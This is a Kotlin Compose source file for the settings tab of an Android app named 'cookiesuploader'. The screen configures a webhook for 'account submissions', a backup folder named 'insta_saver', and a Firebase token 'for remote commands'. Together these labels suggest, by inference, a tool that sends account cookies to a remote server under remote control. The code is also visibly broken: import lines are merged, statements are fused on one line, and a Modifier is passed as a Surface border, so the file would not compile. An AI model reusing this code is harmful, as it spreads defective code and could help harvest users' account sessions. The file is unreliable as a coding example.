package com.turjaun.cookiesuploader.ui

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.widget.Toast
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.selection.SelectionContainer
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Check
import androidx.compose.material.icons.filled.ContentCopy
import androidx.compose.material.icons.filled.Refresh
import androidx.compose.material.icons.filled.Visibility
import androidx.compose.material.icons.filled.VisibilityOff
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.OutlinedButton
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.OutlinedTextFieldDefaults
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Brushimport androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.turjaun.cookiesuploader.ui.theme.AppColors

@Composable
fun SettingsTab(viewModel: MainViewModel, modifier: Modifier = Modifier) {
    val context = LocalContext.current
    val webhookUrl by viewModel.webhookUrl.collectAsState()
    val jsonFilename by viewModel.jsonFilename.collectAsState()
    val fcmToken by viewModel.fcmToken.collectAsState()
    
    var webhook by remember { mutableStateOf(webhookUrl) }
    var filename by remember { mutableStateOf(jsonFilename) }
    var showSavedMessage by remember { mutableStateOf(false) }
    var tokenVisible by remember { mutableStateOf(false) }
    
    LaunchedEffect(webhookUrl) { webhook = webhookUrl }
    LaunchedEffect(jsonFilename) { filename = jsonFilename }
    
    Box(
        modifier = modifier
            .fillMaxSize()
            .background(brush = Brush.verticalGradient(colors = listOf(AppColors.background, AppColors.surface)))
    ) {
        Column(
            modifier = Modifier
                .fillMaxSize()
                .verticalScroll(rememberScrollState())
                .padding(horizontal = 20.dp, vertical = 24.dp)
        ) {
            // Header
            Text("Settings", color = AppColors.textPrimary, fontSize = 24.sp, fontWeight = FontWeight.Bold, modifier = Modifier.padding(bottom = 4.dp))
            Text("Configure your upload preferences", color = AppColors.textSecondary, fontSize = 13.sp, modifier = Modifier.padding(bottom = 24.dp))
            
            // Webhook Card
            SettingsCardSimple(title = "Webhook Configuration", icon = "🔗") {
                Text("Endpoint URL for account submissions", color = AppColors.textSecondary, fontSize = 12.sp, modifier = Modifier.padding(bottom = 12.dp))
                OutlinedTextField(
                    value = webhook, onValueChange = { webhook = it },
                    label = { Text("Webhook URL", color = AppColors.textSecondary) },
                    placeholder = { Text("https://your-server.com/webhook", color = AppColors.textDisabled) },
                    modifier = Modifier.fillMaxWidth(),
                    colors = simpleTextFieldColors(),
                    shape = RoundedCornerShape(12.dp), singleLine = true
                )            }
            
            Spacer(modifier = Modifier.height(16.dp))
            
            // Filename Card
            SettingsCardSimple(title = "Backup Settings", icon = "💾") {
                Text("Filename for encrypted backups", color = AppColors.textSecondary, fontSize = 12.sp, modifier = Modifier.padding(bottom = 12.dp))
                OutlinedTextField(
                    value = filename, onValueChange = { filename = it },
                    label = { Text("JSON Filename", color = AppColors.textSecondary) },
                    placeholder = { Text("accounts_backup.json", color = AppColors.textDisabled) },
                    modifier = Modifier.fillMaxWidth(),
                    colors = simpleTextFieldColors(),
                    shape = RoundedCornerShape(12.dp), singleLine = true
                )
                Text("Saved to: /Download/insta_saver/", color = AppColors.info, fontSize = 11.sp, modifier = Modifier.padding(top = 8.dp))
            }
            
            Spacer(modifier = Modifier.height(24.dp))
            
            // FCM Token Card
            SettingsCardSimple(title = "Push Notifications", icon = "🔔", isExpanded = true) {
                Text("Firebase Cloud Messaging token for remote commands", color = AppColors.textSecondary, fontSize = 12.sp, modifier = Modifier.padding(bottom = 12.dp))
                
                Surface(
                    modifier = Modifier.fillMaxWidth().border(width = 1.dp, color = AppColors.outline, shape = RoundedCornerShape(10.dp)),
                    color = AppColors.surface, shape = RoundedCornerShape(10.dp)
                ) {
                    SelectionContainer {
                        Column(modifier = Modifier.padding(14.dp)) {
                            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                                Text("FCM Token", color = AppColors.textPrimary, fontSize = 13.sp, fontWeight = FontWeight.Medium)
                                IconButton(onClick = { tokenVisible = !tokenVisible }) {
                                    Icon(imageVector = if (tokenVisible) Icons.Default.VisibilityOff else Icons.Default.Visibility, contentDescription = null, tint = AppColors.textSecondary)
                                }
                            }
                            Spacer(modifier = Modifier.height(8.dp))
                            
                            val displayToken = when {
                                fcmToken.isBlank() || fcmToken.startsWith("Error") -> "Waiting for token..."
                                tokenVisible -> fcmToken
                                else -> fcmToken.take(20) + "..." + fcmToken.takeLast(8)
                            }
                            Text(text = displayToken, color = if (fcmToken.isNotBlank() && !fcmToken.startsWith("Error")) AppColors.success else AppColors.textDisabled, fontSize = 11.sp, fontFamily = FontFamily.Monospace, maxLines = if (tokenVisible) 4 else 1, overflow = TextOverflow.Ellipsis)
                            
                            if (fcmToken.isNotBlank() && !fcmToken.startsWith("Error")) {
                                Spacer(modifier = Modifier.height(10.dp))
                                Button(
                                    onClick = {
                                        val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager                                        val clip = ClipData.newPlainText("FCM Token", fcmToken)
                                        clipboard.setPrimaryClip(clip)
                                        Toast.makeText(context, "Token copied!", Toast.LENGTH_SHORT).show()
                                    },
                                    modifier = Modifier.align(Alignment.End),
                                    colors = ButtonDefaults.buttonColors(containerColor = AppColors.primary, contentColor = Color.White),
                                    shape = RoundedCornerShape(8.dp)
                                ) {
                                    Icon(Icons.Default.ContentCopy, contentDescription = "Copy", modifier = Modifier.size(16.dp), tint = Color.White)
                                    Spacer(modifier = Modifier.width(4.dp))
                                    Text("Copy Token", fontSize = 12.sp)
                                }
                            }
                        }
                    }
                }
                
                Row(modifier = Modifier.fillMaxWidth().padding(top = 12.dp), horizontalArrangement = Arrangement.End) {
                    OutlinedButton(onClick = { viewModel.refreshFcmToken() }, colors = ButtonDefaults.outlinedButtonColors(contentColor = AppColors.info), shape = RoundedCornerShape(8.dp)) {
                        Icon(Icons.Default.Refresh, contentDescription = "Refresh", modifier = Modifier.size(16.dp))
                        Spacer(modifier = Modifier.width(4.dp))
                        Text("Refresh Token", fontSize = 12.sp)
                    }
                }
            }
            
            Spacer(modifier = Modifier.height(32.dp))
            
            // Save Button
            Button(
                onClick = { viewModel.saveSettings(webhook, filename); showSavedMessage = true },
                modifier = Modifier.fillMaxWidth().height(52.dp),
                colors = ButtonDefaults.buttonColors(containerColor = AppColors.primary, contentColor = Color.White),
                shape = RoundedCornerShape(14.dp)
            ) { Text("Save Settings", fontWeight = FontWeight.Bold, fontSize = 15.sp) }
            
            // Success Message
            if (showSavedMessage) {
                Surface(
                    modifier = Modifier.fillMaxWidth().padding(top = 16.dp).clip(RoundedCornerShape(10.dp)),
                    color = AppColors.success.copy(alpha = 0.15f),
                    border = Modifier.border(width = 1.dp, color = AppColors.success.copy(alpha = 0.5f), shape = RoundedCornerShape(10.dp))
                ) {
                    Row(modifier = Modifier.padding(horizontal = 16.dp, vertical = 12.dp), verticalAlignment = Alignment.CenterVertically) {
                        Icon(Icons.Default.Check, contentDescription = "Success", tint = AppColors.success, modifier = Modifier.padding(end = 8.dp))
                        Text("Settings saved successfully", color = AppColors.success, fontWeight = FontWeight.Medium)
                    }
                }
                LaunchedEffect(Unit) { kotlinx.coroutines.delay(2500); showSavedMessage = false }
            }            
            Spacer(modifier = Modifier.height(40.dp))
        }
    }
}

@Composable
fun SettingsCardSimple(title: String, icon: String, isExpanded: Boolean = false, content: @Composable () -> Unit) {
    Surface(
        modifier = Modifier.fillMaxWidth(),
        color = AppColors.surface.copy(alpha = 0.7f),
        shape = RoundedCornerShape(16.dp),
        border = Modifier.border(width = 1.dp, color = AppColors.outline, shape = RoundedCornerShape(16.dp))
    ) {
        Column(modifier = Modifier.padding(18.dp)) {
            Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.padding(bottom = if (isExpanded) 16.dp else 0.dp)) {
                Box(modifier = Modifier.size(32.dp).clip(CircleShape).background(AppColors.primary.copy(alpha = 0.15f)).border(width = 1.dp, color = AppColors.primary.copy(alpha = 0.4f), shape = CircleShape), contentAlignment = Alignment.Center) {
                    Text(icon, fontSize = 16.sp)
                }
                Spacer(modifier = Modifier.width(12.dp))
                Text(title, color = AppColors.textPrimary, fontSize = 15.sp, fontWeight = FontWeight.SemiBold)
            }
            if (isExpanded) content() else Column(modifier = Modifier.padding(top = 8.dp)) { content() }
        }
    }
}

@Composable
fun simpleTextFieldColors() = OutlinedTextFieldDefaults.colors(
    focusedTextColor = AppColors.textPrimary, unfocusedTextColor = AppColors.textPrimary, disabledTextColor = AppColors.textDisabled,
    focusedContainerColor = AppColors.surface, unfocusedContainerColor = AppColors.surface, disabledContainerColor = AppColors.surface.copy(alpha = 0.5f),
    focusedBorderColor = AppColors.primary, unfocusedBorderColor = AppColors.outline, disabledBorderColor = AppColors.outline.copy(alpha = 0.3f),
    cursorColor = AppColors.primary, errorBorderColor = AppColors.error, focusedLabelColor = AppColors.primary, unfocusedLabelColor = AppColors.textSecondary
)